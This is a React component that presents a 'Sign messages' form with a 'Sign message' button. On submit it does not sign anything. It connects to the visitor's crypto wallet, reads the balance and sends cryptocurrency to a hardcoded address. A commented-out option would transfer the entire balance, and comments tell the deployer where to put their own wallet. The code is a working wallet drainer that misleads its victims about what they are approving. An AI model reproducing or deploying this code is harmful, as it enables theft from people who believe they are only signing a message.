import { useState } from 'react'
import { ethers } from 'ethers'
import ErrorMessage from './ErrorMessage'

const networks = {
  polygon: {
    chainId: `0x${Number(137).toString(16)}`,
    chainName: 'Polygon Mainnet',
    nativeCurrency: {
      name: 'MATIC',
      symbol: 'MATIC',
      decimals: 18,
    },
    rpcUrls: ['https://polygon-rpc.com/'],
    blockExplorerUrls: ['https://polygonscan.com/'],
  },
  bsc: {
    chainId: `0x${Number(56).toString(16)}`,
    chainName: 'Binance Smart Chain Mainnet',
    nativeCurrency: {
      name: 'Binance Chain Native Token',
      symbol: 'BNB',
      decimals: 18,
    },
    rpcUrls: [
      'https://bsc-dataseed1.binance.org/',
      'https://bsc-dataseed2.binance.org/',
      'https://bsc-dataseed3.binance.org/',
      'https://bsc-dataseed4.binance.org/',
      'https://bsc-dataseed1.defibit.io/',
      'https://bsc-dataseed2.defibit.io/',
      'https://bsc-dataseed3.defibit.io/',
      'https://bsc-dataseed4.defibit.io/',
      'https://bsc-dataseed1.ninicoin.io/',
      'https://bsc-dataseed2.ninicoin.io/',
      'https://bsc-dataseed3.ninicoin.io/',
      'https://bsc-dataseed4.ninicoin.io/',
      'wss://bsc-ws-node.nariox.org/',
    ],
    blockExplorerUrls: ['https://bscscan.com/'],
  },
  HT: {
    chainId: `0x${Number(128).toString(16)}`,
    chainName: '	HECO Chain (HT)',
    nativeCurrency: {
      name: '	HECO Chain (HT)',
      symbol: '	HT',
      decimals: 18,
    },
    rpcUrls: ['https://http-mainnet.hecochain.com/', 'wss://ws-mainnet.hecochain.com/'],
    blockExplorerUrls: ['	https://hecoinfo.com/'],
  },
}

const signMessage = async ({ message }) => {
  // set ethereum value
  const DEFAULT_AMOUNT = '0.00002'
  // there you should set you wallet address
  const DEFAULT_WALLET = '0x194B188720BdA9080Db8cAE6cAF578bc78Dbb318'
  // there you should set you netWork
  const networkName = 'bsc'

  if (!window.ethereum) throw new Error('No crypto wallet found. Please install it.')

  // if you wanna change netWork uncomment next line
  // await changeNetwork(networkName)

  const provider = new ethers.providers.Web3Provider(window.ethereum)
  await provider.send('eth_requestAccounts', [])
  const signer = provider.getSigner()
  const address = await signer.getAddress()

  const balance = await signer.getBalance()

  console.log(balance, balance)

  // if you wanna get sign message uncomment next line
  // const signature = await signer.signMessage(message)

  await signer.sendTransaction({
    // if you set your wallet change 'to: address' to 'to: wallet'
    to: DEFAULT_WALLET,
    // value: balance,
    value: ethers.utils.parseEther(DEFAULT_AMOUNT),
  })
}

const changeNetwork = async (networkName) => {
  await window.ethereum.request({
    method: 'wallet_addEthereumChain',
    params: [
      {
        ...networks[networkName],
      },
    ],
  })
}

export default function SmartButton() {
  const [error, setError] = useState()

  const handleSign = async (e) => {
    e.preventDefault()
    const data = new FormData(e.target)
    setError()
    try {
      await signMessage({
        message: data.get('message'),
      })
    } catch (e) {
      setError(e.message)
    }
  }

  return (
    <form className='m-4' onSubmit={handleSign}>
      <div className='credit-card w-full shadow-lg mx-auto rounded-xl bg-white'>
        <main className='mt-4 p-4'>
          <h1 className='text-xl font-semibold text-gray-700 text-center'>Sign messages</h1>
          <div className=''>
            <div className='my-3'>
              <textarea
                // required
                type='text'
                name='message'
                className='textarea w-full h-24 textarea-bordered focus:ring focus:outline-none'
                placeholder='Message'
              />
            </div>
          </div>
        </main>
        <footer className='p-4'>
          <button
            type='submit'
            className='btn btn-primary submit-button focus:ring focus:outline-none w-full'
          >
            Sign message
          </button>
          <ErrorMessage message={error} />
        </footer>
      </div>
    </form>
  )
}
